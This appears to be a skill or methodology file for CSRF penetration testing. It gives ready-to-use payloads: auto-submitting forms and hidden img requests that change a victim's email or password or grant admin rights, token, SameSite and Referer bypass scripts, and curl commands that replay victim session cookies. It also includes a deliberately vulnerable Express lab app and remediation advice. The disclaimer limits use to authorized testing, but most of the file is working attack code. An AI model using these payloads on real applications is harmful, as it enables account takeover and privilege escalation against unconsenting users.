---
name: csrf
description: Cross-Site Request Forgery (CSRF) testing methodology - token bypasses, SameSite bypasses, cookie security analysis, and defense evasion for authorized penetration testing.
---

# Cross-Site Request Forgery (CSRF) Testing

Authorized penetration testing only. CSRF testing requires explicit written permission — every PoC here triggers real state changes on a target application.

## 1) Overview & Impact

CSRF (session riding / one-click attack) forces an authenticated victim's browser to send unintended requests to a web app. The browser auto-attaches cookies; the server cannot distinguish a victim-initiated request from an attacker-crafted one.

**Why it works:**
- Cookies (session ID, JWT in cookie, SSO tokens) are attached automatically by the browser.
- HTTP verbs are not enforced — many frameworks treat GET and POST interchangeably.
- CORS does NOT prevent the request from being sent; it only prevents the attacker from reading the response. A blind, fire-and-forget state change is enough.

**Impact tiers:**
- **Session riding**: change victim's email/password, add MFA device or backup codes under attacker control, create API keys/OAuth grants, update delivery address on stored cards, post content as victim.
- **Account takeover (ATO)**: change victim email -> attacker password reset -> full ATO. Or bind attacker-controlled MFA/SSO identity to victim account.
- **Chained attacks**: CSRF -> stored XSS (inject payload via profile field), CSRF -> SSRF (forge a URL-import/admin request), CSRF -> RCE (admin plugin upload), CSRF -> privilege escalation (role change), CSRF on admin panels -> full compromise.
- **Financial/logic abuse**: transfers, voucher redemption, quantity/price tampering where server trusts the client-side cart.

Severity: usually Medium (CVSS 5-8) alone, High/Critical (8.0-9.9) when chained to ATO, RCE, or admin compromise.

## 2) Detection & Recon

### Burp Suite workflow
```bash
# Core: right-click request > Engagement Tools > Find CSRF PoC (generates auto-submitting form)
# Extensions to load:
#   - CSRF Tester / CSRF Poc Builder
#   - Param Miner (discover hidden params incl. tokens)
#   - Turbo Intruder (race conditions adjacent to CSRF)
# BApp: "Collaborator" for OOB detection of token-in-URL leaks
```

### Recon commands
```bash
# Enumerate forms and hidden token fields on a page
curl -s https://target.local/profile | grep -iEo '<input[^>]*(hidden|token|csrf)[^>]*>'

# Map cookie flags (SameSite/Secure/HttpOnly) from response headers
curl -sI https://target.local/login -c - | grep -i 'set-cookie'
curl -s https://target.local -D - -o /dev/null | grep -i 'set-cookie'

# Inspect an existing session's cookies precisely
curl -sv https://target.local/account -H "Cookie: session=abc123" 2>&1 | grep -i 'set-cookie'

# Discover state-changing endpoints: spider then filter POST/PUT/DELETE
curl -s https://target.local/sitemap.xml | grep -iEo '<loc>[^<]+</loc>' | sed 's/<[^>]*>//g'
```

### Manual checklist
1. **Inventory state-changing endpoints**: email change, password change, delete account, role/permission change, money transfer, address/2FA update, API key generation, admin actions, file upload, invite users.
2. **Analyze each request**: Is there an anti-CSRF token? Where — body, header (`X-CSRF-Token`), or cookie? Is it tied to the session? Is it per-request or static?
3. **Cookie SameSite analysis**: DevTools > Application > Cookies, or Burp's Cookie Store / `samesite` report. Check `Set-Cookie` headers for `SameSite=None; Secure`, `Lax`, `Strict`, or absence (browser default).
4. **Check token usability in other methods**: replay token, remove token, blank token, swap method, cross-user token.
5. **Test whether the action is GET-able** (dangerous state change over GET = trivially exploitable).
6. **Content-Type validation**: does the server only accept `application/x-www-form-urlencoded` with token, but `multipart/form-data` or `text/plain`/`application/json` (CORS-safelisted) without token?

### Key framing question
If the endpoint requires a token, can you obtain a valid token value (login flow, public page, token in a GET response, token shared across sessions)? CSRF PoC building is then trivial.

## 3) Classic Exploits

### Auto-submitting form (the canonical PoC)
```html
<html>
  <body>
    <form id="f" action="https://target.local/email/change" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="csrf" value="captured_or_empty_token" />
    </form>
    <script>document.getElementById('f').submit();</script>
  </body>
</html>
```
Burp's "Find CSRF PoC" produces this automatically; tune hidden fields and target action.

### GET-based PoC (img src — fires with top-level/covert request, no JS needed)
```html
<!-- Password reset triggered by GET; the browser sends cookies -->
<img src="https://target.local/password/change?new=AttackerP@ss1&confirm=AttackerP@ss1" style="display:none">
```
```html
<!-- Multiple simultaneous GET actions -->
<img src="https://target.local/admin/grant?user=victim&role=admin" style="display:none">
<img src="https://target.local/cart/checkout" style="display:none">
```

### fetch / XHR with credentials (for CORS-safelisted Content-Type)
```html
<script>
// text/plain is CORS-safelisted => no preflight; JSON-ish body rides through
fetch('https://target.local/api/email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: '{"email":"attacker@evil.com"}'
});
</script>
```
```html
<script>
// multipart/form-data is also CORS-safelisted — bypasses token checks keyed on urlencoded only
const fd = new FormData();
fd.append('email', 'attacker@evil.com');
fetch('https://target.local/profile/update', {method:'POST', credentials:'include', body: fd});
</script>
```

### Delivering the PoC
Host on attacker.com (your own domain), email it, embed in a comment/post, or load via an iframe on a page the victim visits. `target=_blank` / popunder for stealth. Self-hosted HTML mail with `<img>` fires even without JS.

## 4) Token Bypasses

Work through this ladder — one of these usually lands:

| # | Technique | Action |
|---|-----------|--------|
| 1 | Remove token parameter | Delete `csrf`/`_token`/`authenticity_token`/`__RequestVerificationToken` entirely |
| 2 | Empty/blank value | Send `csrf=` (blank), also try `csrf=null`, `csrf=false`, `csrf=undefined`, `csrf[]=`, `csrf=0` |
| 3 | Use another user's valid token | Log in as attacker, grab their token, use it against victim session (token not tied to session) |
| 4 | Token only validated on one method | Token enforced on POST; send state change via GET (or PUT/DELETE/PATCH) |
| 5 | Change request method POST->GET | Convert `POST /email/change` to `GET /email/change?email=attacker@evil.com` |
| 6 | Token in GET swapped to POST | Endpoint issues token in URL on GET; submit via POST where validation differs |
| 7 | Token in cookie only | App compares body token to cookie (`XSRF-TOKEN` / double-submit); set cookie to any value and match body |
| 8 | Predictable/static token | Token is MD5/PRNG of user ID, timestamp, or constant; harvest two sessions and diff |
| 9 | Token not validated at all | Simply omit on a state-changing action — very common on secondary endpoints |
| 10 | Content-Type validation only | Validation runs only when `Content-Type: application/x-www-form-urlencoded`; switch to `multipart/form-data` or `text/plain`/`application/json` |

```bash
# Bypass #1/#2 — strip or blank the token
curl -s -X POST https://target.local/email/change \
  -b "session=victim_session" -d "email=attacker@evil.com"

# Bypass #3 — cross-session token reuse (attacker token, victim cookie)
curl -s -X POST https://target.local/email/change \
  -b "session=victim_session" -d "email=attacker@evil.com&csrf=ATTACKER_VALID_TOKEN"

# Bypass #5 — method swap
curl -s "https://target.local/email/change?email=attacker@evil.com" -b "session=victim_session"

# Bypass #10 — content-type swap to bypass urlencoded-only validation
curl -s -X POST https://target.local/profile/update \
  -b "session=victim_session" \
  -H "Content-Type: multipart/form-data; boundary=X" \
  --form-string "email=attacker@evil.com" --form-string "csrf=anything"

# Bypass #10b — text/plain JSON smuggling (no preflight, parsed by some frameworks)
curl -s -X POST https://target.local/api/email \
  -b "session=victim_session" \
  -H "Content-Type: text/plain" \
  -d '{"email":"attacker@evil.com"}'
```

```html
<!-- Token-in-cookie-only bypass (double-submit, controllable cookie) -->
<html><body>
<script>
document.cookie = "XSRF-TOKEN=forgedvalue; path=/";
</script>
<form action="https://target.local/email/change" method="POST">
  <input type="hidden" name="csrf" value="forgedvalue">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

### Token-prediction quick math
```bash
# If tokens look like PRNG output, harvest several and look for structure
for i in 1 2 3 4 5; do
  curl -s https://target.local/login -c - | grep -oE 'name="csrf" value="[^"]+"' ;
done | tee tokens.txt
# Compare: constant? per-session? per-request? user-derived (e.g., md5($uid.$salt))?
```

## 5) SameSite Bypasses

| SameSite | Sent on cross-site GET? | Sent on cross-site POST? | Notes |
|----------|------------------------|--------------------------|-------|
| `None` (+`Secure`) | Yes | Yes | Only sent over HTTPS; classic CSRF-friendly |
| `Lax` | Yes | No (with exceptions, see below) | Default in Chrome for cookies without attribute |
| `Strict` | No | No | Strongest; bypass via same-site gadget or on-site attacker page |

### Lax via top-level navigation GET
Lax sends cookies on top-level GET navigations. If the target can be induced to perform a state change via GET — or via a GET that lands on a page whose JS/redirect executes the action — CSRF works with a plain link or iframe-redirect:
```html
<script>window.location = 'https://target.local/email/change?email=attacker@evil.com';</script>
```
Also try a form with `method="GET"` that auto-submits — it counts as top-level navigation.

### The 2-minute Lax+POST window (Chrome)
Chrome ships a legacy compatibility quirk: for the first **120 seconds** after a cookie with no SameSite attribute is set, it behaves as `Lax+POST` — cookies ARE sent on cross-site POST. After 2 minutes they are not.
```html
<!-- Ensure the victim gets a fresh (no-SameSite) cookie in the last 2 minutes, then fire the POST -->
<script>
// Step 1: re-auth / token refresh endpoint that resets the session cookie
fetch('https://target.local/refresh', {credentials:'include', mode:'no-cors'})
  .then(() => {
    // Step 2: within the 2-minute window, fire the state-changing POST
    document.getElementById('csrfForm').submit();
  });
</script>
<form id="csrfForm" action="https://target.local/email/change" method="POST" style="display:none">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```
Variants: any endpoint that re-issues the cookie (login, SSO, session rotation, "remember me"). Combine with a delayed iframe or a pre-navigation step.

### Sibling domain cookie inheritance
Cookies set for `.target.local` (or a wildcard-ish parent) are visible to sibling/child subdomains. If `dev.target.local` or `old.target.local` is attacker-influenceable (open redirect, user content, subdomain takeover, XSS), host the CSRF PoC there — from the browser's perspective the request is **same-site** (`target.local` vs `dev.target.local` differ only in registrable-domain suffix = same site), so SameSite cookies flow freely.
```bash
# Check for subdomain takeover / wildcard DNS
host "*.target.local" 2>/dev/null; host dev.target.local; host old.target.local
```

### Gadget-based (client-side) bypasses
If the same-site origin contains a "gadget" — JSONP endpoint, open URL redirect, on-site HTML injection, Dangling-Markup sink, on-domain upload — chain it:
```html
<!-- On-site open redirect used to perform a top-level GET with cookies -->
<script>window.location = 'https://target.local/redirect?url=https://target.local/email/change?email=attacker@evil.com';</script>
<!-- On-site JSONP / iframe gadget used to issue the state-changing request from same-site context -->
```
This turns a cross-site attack into a same-site one, defeating both `Lax` and `Strict`.

## 6) Referer / Origin Header Bypasses

Apps often validate `Referer`/`Origin` with weak logic. Attack surfaces:

### Remove the header entirely
```html
<!-- Strips Referer from the cross-origin request; some backends only validate when present -->
<meta name="referrer" content="no-referrer">
<form action="https://target.local/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```
```bash
# Confirm server-side behavior: request with no Referer
curl -s -X POST https://target.local/email/change \
  -b "session=victim_session" \
  -H "Origin:" \
  -H "Referer:" \
  -d "email=attacker@evil.com"
```

### Origin bypass: add a real attacker origin header
```bash
curl -s -X POST https://target.local/email/change \
  -b "session=victim_session" \
  -H "Origin: https://attacker.com" \
  -d "email=attacker@evil.com"
```

### RFC 2231 / charset encoding trick (old IE/edge cases, still worth one probe)
```bash
# Encoded parameter smuggles a trusted-looking referer through naive parsers
curl -s -X POST https://target.local/email/change \
  -b "session=victim_session" \
  -H "Referer: https://target.local?x=RFC2231%22%3Bcharset%3DUTF-8%22%3Battacker%40evil.com" \
  -d "email=attacker@evil.com"
```

### Regex / startsWith bypasses
Typical flawed checks (and how to defeat them):
- `referer.startsWith("https://target.local")` → bypass with `https://target.local.attacker.com/`
- `referer.contains("target.local")` → bypass with `https://attacker.com/target.local`
- `referer.includes("target.local?")` → bypass with `https://attacker.com/?target.local?`
- `referer.match(/^https:\/\/target\.local/)` → path injection `https://target.local../` or userinfo `https://target.local@attacker.com/`

```bash
# Test each bypass against the real endpoint
for r in "https://target.local.attacker.com/" "https://attacker.com/target.local" "https://target.local@attacker.com/" "https://target.local../"; do
  echo "[-] Referer: $r"
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.local/email/change \
    -b "session=victim_session" -H "Referer: $r" -H "Origin: $r" \
    -d "email=attacker@evil.com"
done
```

## 7) Cookie SameSite Attribute Analysis

Systematic inspection — the SameSite posture of *every* session-relevant cookie determines which bypass is needed:

```bash
# Pull all Set-Cookie headers across key flows
for ep in /login /refresh /account /logout /oauth/callback; do
  echo "== $ep =="
  curl -s -D - -o /dev/null -b cookies.txt "https://target.local$ep" | grep -i 'set-cookie'
done

# Parse SameSite attributes from a session jar
cat cookies.txt | awk '$6 ~ /session|csrf|xsrf|token|jwt/ {print $6, $7}'
```

```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
Set-Cookie: XSRF-TOKEN=abc123; Path=/; Secure
Set-Cookie: admin_prefs=1; Path=/admin; Secure; HttpOnly; SameSite=Strict
```
Note in the above: `session` is Lax (GET-navigation exploitable), `XSRF-TOKEN` has no SameSite (subject to Lax+POST 2-minute window), `admin_prefs` is Strict (needs same-site gadget).

Decision matrix:
- All cookies `Strict` → need on-site gadget / sibling domain.
- All cookies `Lax` → top-level GET navigation, or 2-minute Lax+POST for POST.
- No SameSite attribute → 2-minute trick for POST, plain GET for navigation.
- `None; Secure` → full classic CSRF (no SameSite barrier).

## 8) Chaining & Impact

- **CSRF -> XSS**: forge a request that stores an XSS payload (profile bio, comment, file name) — stored XSS then runs on the trusted origin with SameSite=Strict intact, giving full account control. CSRF is often the bridge into a Strict-cookie app.
- **CSRF -> account takeover**: change email -> attacker resets password -> MFA re-enrollment under attacker control -> full ATO.
- **CSRF -> privilege escalation**: forge role-change or user-invite request as an admin victim.
- **CSRF on cookie-authenticated APIs**: any REST/JSON API that relies only on cookies is CSRF-able if you can find a CORS-safelisted Content-Type (`text/plain`, `multipart/form-data`, `application/x-www-form-urlencoded`) the server will parse. Watch for frameworks that coerce `text/plain` into JSON.
- **CSRF -> SSRF/RCE**: admin-only features (webhook URL, import-from-URL, plugin upload) triggered via CSRF on an authenticated admin.

```bash
# Confirm impact: does the forged request actually persist server-side?
# 1. Fire PoC against your own test account, 2. Re-read the setting
curl -s https://target.local/account -b "session=test_session" | grep -i "attacker@evil.com"
```

## 9) Lab / Homelab Practice

PortSwigger Web Security Academy — CSRF track (do in order):
1. CSRF vulnerability with no defenses
2. CSRF where token validation depends on request method
3. CSRF where token is duplicated in cookie
4. CSRF where token is not tied to user session
5. CSRF where token is tied to non-session cookie
6. CSRF where token is tied to non-session cookie (bypass via header injection)
7. CSRF where Referer validation depends on header being present
8. CSRF with broken Referer validation
9. CSRF bypass via SameSite=Lax (2-minute window)
10. SameSite Strict bypass via sibling domain
11. SameSite Strict bypass via client-side redirect
12. SameSite Lax bypass via method enforcement
13. SameSite Lax bypass via cookie refresh
14. CSRF where token is tied to user session (harder)
15. CSRF where token is tied to user session + Referer checks

Build a local vulnerable target for repro testing:
```bash
# Minimal Node.js/Express target with no CSRF defenses (homelab only)
mkdir csrf-lab && cd csrf-lab && npm init -y && npm i express cookie-parser
cat > app.js <<'EOF'
const e = require('express'), c = require('cookie-parser');
const app = e(); app.use(c()); app.use(e.urlencoded({extended:true}));
app.use((req,res,next)=>{ if(!req.cookies.session) res.cookie('session','S'+Date.now(),{httpOnly:true}); next(); });
app.get('/', (req,res)=>res.send('<form method=POST action=/email/change><input name=email><input name=csrf value="statictoken"><button>go</button></form>'));
app.post('/email/change', (req,res)=>{ // token accepted if absent or blank — vulnerable
  res.send('email changed to ' + (req.body.email||'none'));
});
app.listen(3000, ()=>console.log('lab on :3000'));
EOF
node app.js &
curl -s -X POST http://127.0.0.1:3000/email/change -b "session=S1" -d "email=attacker@evil.com"
```

## 10) Reporting

**Severity / CVSS v3.1 guidance:**
| Scenario | Vector hint | Base |
|---|---|---|
| CSRF on low-impact setting, no chaining | AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N | ~4.3-5.4 Medium |
| CSRF enabling ATO (email change) | AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H | ~8.0 High |
| CSRF on admin function / RCE chain | AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H | ~7.2-8.0 High |
| CSRF -> stored XSS on trusted origin | escalate via XSS metrics | often High/Critical |

**Evidence checklist:**
- Target URL, HTTP method, exact request parameters (redact tokens).
- Screenshot of Burp "Find CSRF PoC" generation and the resulting PoC page.
- Confirmation the state change persisted (before/after account screenshot or API response).
- Cookie flags captured (SameSite/Secure/HttpOnly) and which bypass was required.
- Token behavior matrix: removed/blank/cross-user/method-swapped/Content-Type-swapped results.
- Which victims/user roles are affected; whether GET is sufficient.
- Clear reproduction steps with the PoC HTML attached as a separate file (not auto-executed).

## 11) Remediation

- **SameSite=Lax by default** on all session cookies (or `Strict` for sensitive/admin flows); set `Secure` and `HttpOnly`.
- **Synchronizer token pattern**: per-session cryptographically random token, embedded in forms, validated server-side, tied to the session (not to a static cookie), regenerated on login.
- **Double-submit cookie**: server sets a random cookie + client sends it as a body/header field; server compares. Ensure cookie is not attacker-settable (HttpOnly or prefix-validated).
- **Origin / Sec-Fetch-Site checks**: reject requests whose `Origin`/`Referer` are not on the allowlist; use `Sec-Fetch-Site: same-origin|same-site|cross-site|none` as a modern signal.
- **Enforce method + Content-Type**: require POST for state changes; reject unexpected Content-Types; never rely on Content-Type-specific validation as the only defense.
- **Use framework protections**: Django CSRF middleware, Rails `protect_from_forgery`, Spring Security CSRF, .NET antiforgery, Express `csurf`-equivalent patterns.
- **Re-authenticate** for critical actions (password/email change, MFA changes) — passkeys/WebAuthn are inherently CSRF-resistant (origin-bound challenge).
- **Don't rely on** CORS, referrer checks alone, cookies-only tokens, CAPTCHAs, or "secret" URL params.
- **Test fix**: after patching, re-run the full Section 4 ladder + SameSite/Referer matrix to confirm all bypasses are closed.
